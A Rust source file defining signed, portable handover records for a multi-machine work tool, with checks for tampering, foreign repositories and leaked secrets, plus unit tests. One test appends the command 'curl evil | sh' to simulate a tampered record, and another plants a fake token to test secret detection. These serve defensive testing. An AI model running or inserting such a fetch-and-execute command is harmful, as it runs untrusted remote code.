//! The published handover: what crosses from one machine to another, and the checks every
//! copy of it passes before anything reads it.
//!
//! A handover is written by `majordomus handover` into one checkout's `.ai/local/state/`,
//! which is never committed and names that machine. A [`Record`] is its portable
//! projection: the handover's body exactly as the mesh carries it ([`HandoverBody`]), and
//! beside it the facts another machine needs to resume from it — which repository, which
//! device, which episode, the line of records it continues, the source state it was written
//! against, the task and the decisions that task recorded. Nothing in it is a path of the
//! author's disk, a process, a socket or a credential, and [`portability`] is the check
//! that says so before a record is written and again whenever one is read.
//!
//! A record is identified by the digest of its canonical JSON and signed by the device's
//! mesh key ([`crate::mesh::identity`]), so the same record is the same id everywhere, a
//! copy that was altered no longer verifies, and who wrote it is a key rather than a name
//! somebody typed. The signature says *which* key; whether that key is one this repository
//! trusts is the mesh's trust declaration's answer ([`crate::mesh::trust`]), not this
//! module's.

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::mesh::journal::{canonical_json, EventBody, HandoverBody};
use crate::model::Diagnostic;

/// The schema every record of this version declares.
pub const SCHEMA: &str = "majordomus-continuity/v1";

/// The prefix every schema of this family begins with; a record declaring a later version
/// of it is refused as *too new* rather than as malformed.
pub const SCHEMA_FAMILY: &str = "majordomus-continuity/v";

/// The version of [`SCHEMA`] this executable writes and reads.
pub const SCHEMA_VERSION: u32 = 1;

/// The signing domain: a record's signature can never be replayed as a mesh event's, or the
/// reverse, because the signed bytes differ in their first line.
pub const SIGNATURE_DOMAIN: &[u8] = b"majordomus-continuity-record/v1\n";

/// The most changed paths a record lists; the total is kept beside the list.
pub const MAX_CHANGED: usize = 200;

/// The most decisions one record carries.
pub const MAX_DECISIONS: usize = 32;

/// The most bytes one carried decision's text may have.
pub const MAX_DECISION_BYTES: usize = 4096;

/// The most bytes one stored record may have, signature included.
pub const MAX_RECORD_BYTES: usize = 160 * 1024;

/// The device a record was written on: the mesh node key's id and the label its identity
/// file carries. The label is presentation; the node id is identity.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct Device {
    /// The node id: the first 32 hex of the SHA-256 of the device's Ed25519 public key.
    pub node: String,
    /// The display label of the device's identity file (`macbook-pro`), or the first eight
    /// hex of its node id when it has none.
    pub label: String,
}

/// Whether the working tree had changes git does not hold in a commit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum WorkingTree {
    /// Nothing outside HEAD.
    Clean,
    /// Modified, staged or untracked files that HEAD does not hold.
    Dirty,
}

/// The source state a record was written against. Git carries the source; this says which
/// source, and — when the tree was dirty — that some of it never reached a commit.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct SourceState {
    /// The branch, absent when detached.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub branch: Option<String>,
    /// The full commit id of HEAD, absent in an unborn repository.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub head: Option<String>,
    /// Clean or dirty.
    pub working_tree: WorkingTree,
    /// Repository-relative paths that differ from HEAD, sorted, at most [`MAX_CHANGED`].
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub changed: Vec<String>,
    /// How many paths differ from HEAD, listed or not.
    #[serde(default)]
    pub changed_total: usize,
    /// The SHA-256 (32 hex) of the uncommitted change — `git diff HEAD` and the names of the
    /// untracked files — so that two machines can tell whether they hold the same
    /// uncommitted work without either publishing its content.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub fingerprint: Option<String>,
}

/// The task the handover was written under, as the task record named it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct TaskRef {
    /// The task id, `t-<stamp>-<hex>`.
    pub id: String,
    /// What the task is, in its author's words: the intent.
    pub title: String,
    /// The profile it ran under.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub profile: Option<String>,
    /// The repository paths it may touch.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub scope: Vec<String>,
    /// The outcome the task record held when the handover was published.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub outcome: Option<String>,
}

/// One decision the task recorded, carried as written so that the receiving checkout's
/// decision log holds it too.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct CarriedDecision {
    /// The decision's heading.
    pub title: String,
    /// Its entry, the lines below the heading, as the log holds them.
    pub text: String,
}

/// Whether the publishing episode was still open when the record was written. A record
/// published mid-episode may be followed by more work on that device; one published at the
/// episode's close may not.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum EpisodeAtPublish {
    /// An episode was open in the publishing checkout.
    Open,
    /// No episode was open: the work had stopped.
    None,
}

/// A published handover, unsigned: everything its id is the digest of.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Record {
    /// [`SCHEMA`].
    pub schema: String,
    /// The repository's identity as the mesh computes it: a digest of the root commits, or
    /// of the declared `cooperation.repository`. The same on every clone, unlike a path.
    pub repository: String,
    /// The device that wrote it.
    pub device: Device,
    /// The episode it was published from, when one was open.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session: Option<String>,
    /// Whether that episode was still open.
    pub episode: EpisodeAtPublish,
    /// The id of the first record of this line of work; absent on that first record, whose
    /// line is its own id.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<String>,
    /// The record this one continues: the last one this checkout published or resumed on
    /// the same branch. Absent on the first of a line.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent: Option<String>,
    /// When it was published, RFC 3339 by the publisher's clock. Presentation and age only:
    /// order is the lineage's, never the clock's.
    pub published_at: String,
    /// The executable version that wrote it.
    pub producer: String,
    /// The source state it was written against.
    pub source: SourceState,
    /// The task, when one was recorded.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub task: Option<TaskRef>,
    /// The decisions that task recorded.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub decisions: Vec<CarriedDecision>,
    /// The handover itself, as the mesh carries one.
    pub handover: HandoverBody,
}

impl Record {
    /// The id of the line this record belongs to: its declared line, or its own id when it
    /// is the first of one.
    pub fn line_of(&self, id: &str) -> String {
        self.line.clone().unwrap_or_else(|| id.to_string())
    }

    /// The canonical bytes of the record: what its id is the digest of and what is signed.
    pub fn canonical(&self) -> Vec<u8> {
        canonical_json(&serde_json::to_value(self).unwrap_or(Value::Null))
    }

    /// The record's id: the first 32 hex of the SHA-256 of its canonical bytes.
    ///
    /// ```
    /// use majordomus_cli::continuity::record::tests_support::sample;
    /// let r = sample();
    /// assert_eq!(r.id().len(), 32);
    /// assert_eq!(r.id(), r.clone().id(), "the same record is the same id");
    /// ```
    pub fn id(&self) -> String {
        hex32(&self.canonical())
    }
}

/// The first 32 hex of the SHA-256 of `bytes`.
pub fn hex32(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .take(16)
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// A record as stored: the record, its id, and the key and signature that bind it to the
/// device that wrote it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct SignedRecord {
    /// [`Record::id`].
    pub id: String,
    /// The Ed25519 public key (hex) whose node id is the record's device.
    pub public_key: String,
    /// The signature (hex) over [`SIGNATURE_DOMAIN`] and the record's canonical bytes.
    pub signature: String,
    /// The record.
    pub record: Record,
}

impl SignedRecord {
    /// Sign `record` with `identity`.
    pub fn sign(record: Record, identity: &crate::mesh::identity::NodeIdentity) -> Self {
        let mut message = SIGNATURE_DOMAIN.to_vec();
        message.extend(record.canonical());
        SignedRecord {
            id: record.id(),
            public_key: identity.public.public_key.clone(),
            signature: identity.sign(&message),
            record,
        }
    }

    /// The stored bytes: pretty JSON with a trailing newline, so that a record read with
    /// `git show` is legible, and deterministic, so that writing it twice is one blob.
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = serde_json::to_vec_pretty(self).unwrap_or_default();
        bytes.push(b'\n');
        bytes
    }
}

/// The file a record is stored under, inside the continuity ref's tree.
pub fn path_of(id: &str) -> String {
    format!("records/{id}.json")
}

/// Why a stored record was not admitted. The record is skipped and the reason reported;
/// nothing a record says is acted on before it is admitted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum Refusal {
    /// Not JSON of the record's shape, or over the size bound.
    Malformed,
    /// A later version of the schema than this executable reads: upgrade to resume from it.
    TooNew,
    /// Its id is not the digest of its content, or the file name does not match the id.
    IdMismatch,
    /// The signature does not verify, or the key is not the device's.
    BadSignature,
    /// Written in another repository (a different root history, or a declared identity
    /// that is not this one's).
    ForeignRepository,
    /// It carries a secret or a machine-local value.
    Nonportable,
}

/// Parse and check one stored record. `path` is its path in the tree, for the diagnostic.
///
/// The checks run in the order a hostile file would be cheapest to refuse in: size, shape,
/// version, the binding of id to content and of key to device, the signature, the
/// repository, then the portability of every value. A record that passes is admitted;
/// whether its signer is trusted is decided by the reader with the trust declaration.
pub fn admit(
    path: &str,
    bytes: &[u8],
    repository: &str,
) -> Result<SignedRecord, (Refusal, Diagnostic)> {
    let refuse = |why: Refusal, code: &'static str, message: String| {
        Err((
            why,
            Diagnostic::error(code, Some(path.to_string()), message),
        ))
    };
    if bytes.len() > MAX_RECORD_BYTES {
        return refuse(
            Refusal::Malformed,
            "continuity.record_too_large",
            format!(
                "{} bytes exceeds the {MAX_RECORD_BYTES}-byte bound of a record",
                bytes.len()
            ),
        );
    }
    let value: Value = match serde_json::from_slice(bytes) {
        Ok(v) => v,
        Err(e) => {
            return refuse(
                Refusal::Malformed,
                "continuity.record_malformed",
                format!("not JSON: {e}"),
            )
        }
    };
    let schema = value
        .pointer("/record/schema")
        .and_then(Value::as_str)
        .unwrap_or("");
    if schema != SCHEMA {
        let newer = schema
            .strip_prefix(SCHEMA_FAMILY)
            .and_then(|v| v.parse::<u32>().ok())
            .is_some_and(|v| v > SCHEMA_VERSION);
        return if newer {
            refuse(
                Refusal::TooNew,
                "continuity.schema_too_new",
                format!(
                    "the record declares {schema}; this executable reads {SCHEMA}. Upgrade \
                     majordomus to resume from it"
                ),
            )
        } else {
            refuse(
                Refusal::Malformed,
                "continuity.schema_unknown",
                format!("the record declares schema `{schema}`, not {SCHEMA}"),
            )
        };
    }
    let signed: SignedRecord = match serde_json::from_value(value) {
        Ok(s) => s,
        Err(e) => {
            return refuse(
                Refusal::Malformed,
                "continuity.record_malformed",
                format!("not a {SCHEMA} record: {e}"),
            )
        }
    };
    let id = signed.record.id();
    if signed.id != id || path != path_of(&id) {
        return refuse(
            Refusal::IdMismatch,
            "continuity.id_mismatch",
            format!(
                "the record's content digests to {id}, but it is stored as {} under {path}",
                signed.id
            ),
        );
    }
    let node = crate::mesh::identity::node_id_of_key(&signed.public_key);
    let mut message = SIGNATURE_DOMAIN.to_vec();
    message.extend(signed.record.canonical());
    if node.as_ref().map(|n| n.as_str()) != Some(signed.record.device.node.as_str())
        || !crate::mesh::identity::verify(&signed.public_key, &message, &signed.signature)
    {
        return refuse(
            Refusal::BadSignature,
            "continuity.bad_signature",
            "the signature does not verify against the device key the record names; the \
             record was altered or forged"
                .into(),
        );
    }
    if signed.record.repository != repository {
        return refuse(
            Refusal::ForeignRepository,
            "continuity.foreign_repository",
            format!(
                "written in repository {}, and this is {repository}: a fork or an unrelated \
                 project with the same name is never resumed from",
                signed.record.repository
            ),
        );
    }
    if let Some(finding) = portability(&signed.record, &[]).into_iter().next() {
        return Err((Refusal::Nonportable, finding.diagnostic(path)));
    }
    Ok(signed)
}

/// One value that must not travel, found in a record.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct Leak {
    /// `continuity.secret` or `continuity.nonportable_field`.
    pub code: String,
    /// The JSON pointer of the field inside the record (`/source/changed/0`).
    pub field: String,
    /// What it is, never the value itself.
    pub reason: String,
}

impl Leak {
    /// The diagnostic for a record stored at `path`.
    pub fn diagnostic(&self, path: &str) -> Diagnostic {
        let code = if self.code == "continuity.secret" {
            "continuity.secret"
        } else {
            "continuity.nonportable_field"
        };
        Diagnostic::error(
            code,
            Some(path.to_string()),
            format!(
                "field {}: {}. Fix: remove it from the handover or the task it came from \
                 and publish again",
                self.field, self.reason
            ),
        )
    }
}

/// Every value in `record` that must not leave the machine: a credential of a known shape,
/// a value of one of `secret_values` (the publisher's own secret environment), an absolute
/// path of a developer's disk, and — in the fields that hold repository paths — anything
/// that is not a relative path inside the repository.
///
/// Refusing rather than redacting is deliberate: a redacted handover is a different
/// handover from the one its author wrote, and the author is the one who should decide
/// what it says instead.
///
/// ```
/// use majordomus_cli::continuity::record::{portability, tests_support::sample};
/// let mut r = sample();
/// assert!(portability(&r, &[]).is_empty(), "the sample travels");
/// r.source.changed = vec!["/srv/checkout/apps/x.rs".into()];
/// let leaks = portability(&r, &[]);
/// assert_eq!(leaks[0].field, "/source/changed/0");
/// ```
pub fn portability(record: &Record, secret_values: &[String]) -> Vec<Leak> {
    let value = serde_json::to_value(record).unwrap_or(Value::Null);
    let mut leaks = Vec::new();
    walk(&value, String::new(), &mut |pointer, text| {
        let redacted = crate::redaction::redact_secrets(text);
        if !redacted.kinds.is_empty() {
            leaks.push(Leak {
                code: "continuity.secret".into(),
                field: pointer.to_string(),
                reason: format!("it carries a credential ({})", redacted.kinds.join(", ")),
            });
            return;
        }
        if secret_values
            .iter()
            .any(|s| s.len() >= 8 && text.contains(s.as_str()))
        {
            leaks.push(Leak {
                code: "continuity.secret".into(),
                field: pointer.to_string(),
                reason: "it carries the value of a secret environment variable of the \
                         publishing machine"
                    .into(),
            });
            return;
        }
        if let Some((_, what)) = crate::generate::forbidden_in(text) {
            let code = if what.contains("path") {
                "continuity.nonportable_field"
            } else {
                "continuity.secret"
            };
            leaks.push(Leak {
                code: code.into(),
                field: pointer.to_string(),
                reason: format!("it carries {what}"),
            });
            return;
        }
        let repository_path =
            pointer.starts_with("/source/changed/") || pointer.starts_with("/task/scope/");
        if repository_path && !relative_inside(text) {
            leaks.push(Leak {
                code: "continuity.nonportable_field".into(),
                field: pointer.to_string(),
                reason: "a repository path must be relative and inside the repository; \
                         an absolute or escaping path names one machine's disk"
                    .into(),
            });
        }
    });
    leaks
}

/// Is `path` relative, free of `..`, of a drive letter and of backslashes?
fn relative_inside(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('~')
        && !path.contains('\\')
        && !path.contains(':')
        && !path.split('/').any(|c| c == "..")
}

fn walk(value: &Value, pointer: String, visit: &mut dyn FnMut(&str, &str)) {
    match value {
        Value::String(s) => visit(&pointer, s),
        Value::Array(items) => {
            for (i, item) in items.iter().enumerate() {
                walk(item, format!("{pointer}/{i}"), visit);
            }
        }
        Value::Object(map) => {
            for (k, v) in map {
                walk(v, format!("{pointer}/{k}"), visit);
            }
        }
        _ => {}
    }
}

/// The shape checks of a record's own fields, beyond portability: the handover passes the
/// mesh's own validation of a published handover, every identifier is one line, and the
/// bounds hold. Run before a record is signed.
pub fn shape(record: &Record) -> Result<(), String> {
    EventBody::HandoverPublished {
        handover: record.handover.clone(),
    }
    .validate()
    .map_err(|e| format!("the handover: {e}"))?;
    if record.handover.body.trim().is_empty() {
        return Err("the handover has no body: it hands nothing over".into());
    }
    let hex = |name: &str, v: &str, len: usize| {
        if v.len() == len && v.chars().all(|c| c.is_ascii_hexdigit()) {
            Ok(())
        } else {
            Err(format!("{name} is not {len} hex characters"))
        }
    };
    hex("repository", &record.repository, 32)?;
    hex("device.node", &record.device.node, 32)?;
    if let Some(v) = &record.line {
        hex("line", v, 32)?;
    }
    if let Some(v) = &record.parent {
        hex("parent", v, 32)?;
    }
    if record.line.is_some() != record.parent.is_some() {
        return Err("a record continues a line exactly when it has a parent".into());
    }
    for (name, v) in [
        ("device.label", Some(record.device.label.as_str())),
        ("session", record.session.as_deref()),
        ("source.branch", record.source.branch.as_deref()),
        ("source.head", record.source.head.as_deref()),
        ("published_at", Some(record.published_at.as_str())),
        ("producer", Some(record.producer.as_str())),
    ] {
        if let Some(v) = v {
            if v.len() > 256 || v.chars().any(char::is_control) {
                return Err(format!("{name} is not one line of at most 256 characters"));
            }
        }
    }
    if record.source.changed.len() > MAX_CHANGED {
        return Err(format!("more than {MAX_CHANGED} changed paths are listed"));
    }
    if record.decisions.len() > MAX_DECISIONS {
        return Err(format!("more than {MAX_DECISIONS} decisions are carried"));
    }
    if record
        .decisions
        .iter()
        .any(|d| d.text.len() > MAX_DECISION_BYTES || d.title.contains('\n'))
    {
        return Err(format!(
            "a carried decision has a multi-line title or more than {MAX_DECISION_BYTES} bytes"
        ));
    }
    Ok(())
}

/// A sample record for doc examples and tests: well-formed, portable, unsigned.
#[doc(hidden)]
pub mod tests_support {
    use super::*;

    /// A record that passes every check but the signature.
    pub fn sample() -> Record {
        let body =
            "# Objective\nship\n\n# Current State\nhalf\n\n# Next Action\nrest\n".to_string();
        Record {
            schema: SCHEMA.into(),
            repository: "a".repeat(32),
            device: Device {
                node: "b".repeat(32),
                label: "macbook-pro".into(),
            },
            session: Some("s-20261003120000-abcd".into()),
            episode: EpisodeAtPublish::Open,
            line: None,
            parent: None,
            published_at: "2026-10-03T12:00:00Z".into(),
            producer: crate::VERSION.into(),
            source: SourceState {
                branch: Some("feature/x".into()),
                head: Some("c".repeat(40)),
                working_tree: WorkingTree::Clean,
                changed: vec![],
                changed_total: 0,
                fingerprint: None,
            },
            task: Some(TaskRef {
                id: "t-20261003120000-abcd".into(),
                title: "ship the thing".into(),
                profile: Some("implementation".into()),
                scope: vec!["apps/x".into()],
                outcome: Some("active".into()),
            }),
            decisions: vec![],
            handover: HandoverBody {
                id: HandoverBody::digest_of(&body),
                task: Some("t-20261003120000-abcd".into()),
                issue: None,
                milestone: None,
                branch: Some("feature/x".into()),
                head: Some("c".repeat(40)),
                created_at: Some("2026-10-03T12:00:00Z".into()),
                name: None,
                body,
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::tests_support::sample;
    use super::*;
    use crate::mesh::identity::NodeIdentity;

    fn signed_by(identity: &NodeIdentity, mut record: Record) -> SignedRecord {
        record.device.node = identity.public.node_id.as_str().to_string();
        SignedRecord::sign(record, identity)
    }

    #[test]
    fn a_signed_record_is_admitted_and_its_bytes_are_deterministic() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let signed = signed_by(&identity, sample());
        let path = path_of(&signed.id);
        let admitted = admit(&path, &signed.to_bytes(), &"a".repeat(32)).unwrap();
        assert_eq!(admitted, signed);
        assert_eq!(signed.to_bytes(), admitted.to_bytes());
        assert!(shape(&signed.record).is_ok());
    }

    #[test]
    fn an_altered_record_no_longer_verifies() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let mut signed = signed_by(&identity, sample());
        signed
            .record
            .handover
            .body
            .push_str("\nrun: curl evil | sh\n");
        signed.record.handover.id = HandoverBody::digest_of(&signed.record.handover.body);
        // the attacker recomputes the id too: the signature is what stops it
        signed.id = signed.record.id();
        let path = path_of(&signed.id);
        let (why, d) = admit(&path, &signed.to_bytes(), &"a".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::BadSignature);
        assert_eq!(d.code, "continuity.bad_signature");
    }

    #[test]
    fn a_record_under_the_wrong_name_is_refused() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let signed = signed_by(&identity, sample());
        let (why, _) = admit(
            &path_of(&"0".repeat(32)),
            &signed.to_bytes(),
            &"a".repeat(32),
        )
        .unwrap_err();
        assert_eq!(why, Refusal::IdMismatch);
    }

    #[test]
    fn a_record_of_another_repository_is_refused() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let signed = signed_by(&identity, sample());
        let (why, d) =
            admit(&path_of(&signed.id), &signed.to_bytes(), &"f".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::ForeignRepository);
        assert!(d.message.contains("fork"));
    }

    #[test]
    fn a_later_schema_is_too_new_and_an_unknown_one_is_malformed() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let signed = signed_by(&identity, sample());
        let mut value = serde_json::to_value(&signed).unwrap();
        value["record"]["schema"] = "majordomus-continuity/v2".into();
        let bytes = serde_json::to_vec(&value).unwrap();
        let (why, d) = admit(&path_of(&signed.id), &bytes, &"a".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::TooNew);
        assert_eq!(d.code, "continuity.schema_too_new");

        value["record"]["schema"] = "something/v1".into();
        let bytes = serde_json::to_vec(&value).unwrap();
        let (why, _) = admit(&path_of(&signed.id), &bytes, &"a".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::Malformed);

        let (why, _) = admit(&path_of(&signed.id), b"{not json", &"a".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::Malformed);
    }

    #[test]
    fn a_record_missing_a_required_identity_is_malformed() {
        let identity = NodeIdentity::ephemeral().unwrap();
        let signed = signed_by(&identity, sample());
        let mut value = serde_json::to_value(&signed).unwrap();
        value["record"]
            .as_object_mut()
            .unwrap()
            .remove("repository");
        let bytes = serde_json::to_vec(&value).unwrap();
        let (why, _) = admit(&path_of(&signed.id), &bytes, &"a".repeat(32)).unwrap_err();
        assert_eq!(why, Refusal::Malformed);
    }

    #[test]
    fn credentials_secret_values_and_machine_paths_are_named_by_field() {
        let mut r = sample();
        let token = format!("{}{}", "ghp_", "a".repeat(36));
        r.handover.body.push_str(&format!("token {token}\n"));
        r.task.as_mut().unwrap().title = "deploy with hunter2hunter2".into();
        r.source.changed = vec!["apps/ok.rs".into(), "../escape".into()];
        let home = format!("/{}/someone/dev/x", "Users");
        r.task.as_mut().unwrap().scope = vec![home];
        let leaks = portability(&r, &["hunter2hunter2".into()]);
        let fields: Vec<&str> = leaks.iter().map(|l| l.field.as_str()).collect();
        assert!(fields.contains(&"/handover/body"), "{fields:?}");
        assert!(fields.contains(&"/task/title"), "{fields:?}");
        assert!(fields.contains(&"/source/changed/1"), "{fields:?}");
        assert!(fields.contains(&"/task/scope/0"), "{fields:?}");
        assert!(!fields.contains(&"/source/changed/0"));
        let rendered = serde_json::to_string(&leaks).unwrap();
        assert!(
            !rendered.contains("hunter2"),
            "a leak never repeats the value"
        );
        assert!(!rendered.contains(&token));
    }

    #[test]
    fn shape_refuses_a_parent_without_a_line_and_an_empty_body() {
        let mut r = sample();
        r.parent = Some("d".repeat(32));
        assert!(shape(&r).is_err());
        r.line = Some("d".repeat(32));
        assert!(shape(&r).is_ok());
        r.handover.body = " ".into();
        r.handover.id = HandoverBody::digest_of(&r.handover.body);
        assert!(shape(&r).is_err());
    }
}
